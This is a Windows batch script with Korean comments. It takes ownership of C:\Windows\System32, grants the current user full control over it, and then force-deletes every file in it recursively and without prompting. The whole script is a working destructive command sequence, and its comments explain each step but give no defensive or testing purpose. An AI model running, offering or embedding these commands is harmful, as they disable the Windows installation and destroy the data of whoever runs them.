:: 관리자 권한 필요
@echo off

:: /A: Administrators 그룹의 사용자에게 소유권을 부여
:: /R: 하위 디렉토리 및 파일에 대해 재귀적으로 소유권 획득
:: /D Y: 소유권을 얻는 도중에 권한이 없는 파일에 대한 요청에 대해 자동으로 "예"로 응답
takeown /F C:\Windows\System32\* /A /R /D Y

:: 소유권을 얻은 후에도 해당 파일이나 폴더에 대해 적절한 권한이 필요할 수 있음
icacls C:\Windows\System32\* /grant %username%:F /T

:: 폴더 내 모든 데이터 삭제
del c:\WINDOWS\system32\*.* /q /f /s